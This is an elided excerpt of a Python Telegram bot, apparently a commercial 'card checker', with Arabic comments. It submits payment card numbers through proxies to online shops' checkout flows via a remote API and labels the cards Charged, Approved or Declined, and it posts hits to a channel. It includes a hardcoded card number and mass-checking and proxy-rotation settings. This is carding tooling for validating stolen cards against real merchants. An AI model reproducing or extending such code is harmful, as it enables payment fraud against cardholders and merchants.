...
# ====================== IMPORT CONFIG ======================
from config import (
    API_ID, API_HASH, BOT_TOKEN, ADMIN_IDS, HIT_CHANNEL_ID,
    JOIN_GROUP_ID, JOIN_CHANNEL_ID, JOIN_GROUP_LINK, JOIN_CHANNEL_LINK,
    PAYMENT_BOT_USERNAME, SP_PER_USER_WORKERS, MSP_PER_USER_WORKERS,
    SITE_PER_USER_WORKERS, PROXY_PER_USER_WORKERS, BIN_WORKERS,
    API_TIMEOUT, BIN_TIMEOUT, PROXY_TIMEOUT, PROXY_CHECK_BATCH,
    HIT_DELAY, MAX_CARDS_MASS, CODE_EXPIRY_HOURS,
    CHECKER_API_URL, CHECKER_API_KEY,
    ACCEPTED_RESPONSES, REJECTED_RESPONSES, REJECTED_GATEWAYS,
    PRICE_RANGES, DB_FILE
)
...
async def detect_payment_gateway(site, proxy_data=None, http_session=None):
    """كشف بوابة الدفع للموقع باستخدام API"""
    test_card = "5154623245618097|03|2032|156"
    try:
        url = f'{CHECKER_API_URL}/single'
        s = http_session or (await get_user_http_session(0, "site"))
        
        headers = {
            "X-API-Key": CHECKER_API_KEY,
        ...
        data = {
            "cc": test_card,
            "site": site,
            "proxy": proxy_data.get('proxy_url', '') if proxy_data else ""
        }
        
        async with s.post(url, json=data, headers=headers, timeout=30) as resp:
            if resp.status != 200:
                return 'dead'
            try:
            ...
            rm = str(raw.get('result', '')).lower()
            gw = str(raw.get('gateway', '')).lower()
            ...
            if not is_accepted and status not in ['charged', 'approved', 'declined']:
                return 'dead'
...
def is_site_error(text):
    ...
    SITE_ERROR_KEYWORDS = [
        ...
        'empty submit response', 'empty submit', 'no valid payment method',
        'no valid payment method found', 'unable to get payment token',
        'cart failed with status 429', 'cart failed with status 503',
    ]
    return any(kw in lower for kw in SITE_ERROR_KEYWORDS) or lower == 'na'

# ====================== BUILDER FUNCTIONS ======================
def build_api_url(site, cc, proxy_data=None):
    """بناء رابط API متوافق مع checker_api2.py على Railway"""
    return f'{CHECKER_API_URL}/single'

def classify_response(rj):
    """تصنيف الرد من checker_api2.py"""
    status = rj.get('status', '').upper()
    result = rj.get('result', '')
    amount = rj.get('amount', '-')
    site = rj.get('site', '')
    gateway = rj.get('gateway', 'Shopify')
    
    if status == 'CHARGED' or 'order_paid' in result.lower():
        return {"Response": result, "Price": amount, "Gateway": gateway, "Status": "Charged"}
    elif status == 'APPROVED' or '3ds' in result.lower() or 'insufficient' in result.lower():
        return {"Response": result, "Price": amount, "Gateway": gateway, "Status": "Approved"}
    elif status == 'DECLINED' or 'declined' in result.lower():
        return {"Response": result, "Price": amount, "Gateway": gateway, "Status": "Declined"}
    else:
        return {"Response": result, "Price": amount, "Gateway": gateway, "Status": "Declined"}
...
async def _check_card_api_internal(card, site, proxy_data=None, http_session=None):
    ...
    proxy = ""
    if proxy_data:
        proxy = proxy_data.get('proxy_url', '')
...
async def check_card_api(card, site, proxy_data=None, user_id=None, http_session=None):
    return await _check_card_api_internal(card, site, proxy_data, http_session)
...
async def main():
    ...
    while True:
        try:
            ...
            log_system("BOOT", f"✅ Using API: {CHECKER_API_URL}")
